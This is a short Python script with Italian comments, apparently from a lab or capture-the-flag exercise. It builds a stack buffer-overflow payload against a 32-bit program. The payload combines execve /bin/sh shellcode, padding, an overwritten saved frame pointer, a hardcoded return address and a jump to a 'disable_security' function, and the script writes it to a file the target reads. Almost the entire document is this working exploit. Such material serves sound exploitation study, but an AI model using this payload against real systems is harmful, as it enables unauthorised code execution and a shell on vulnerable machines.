import os
import struct

#scopo: eseguire lo shellcode usando la strcpy di print_function

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#bisogna entrare in print_function: 
#fare disable sec check per entrare nell'else
#caricare lo shellcode facendo buffer overflow mettendo x dentro canary se no non passa il controll

disable_security = 0x804852b

#####viene invocata dentro il main dopo l'if su fp
print_function = 0x8048559

dst = 0xbffff158

#va pensato al ""contrario""
payload = shellcode
#epb-0x70
payload += "A"*(0x70 - len(shellcode))
payload += "B"*4 #epb

payload += struct.pack("I", dst)

#nonostante il for c'e` da mettere quello che esce dal pattern
payload += "B"*(263 - len(payload))
payload += struct.pack("I", disable_security)


f = open("badfile-bof", "w")
f.write("%s" % payload)
f.close()
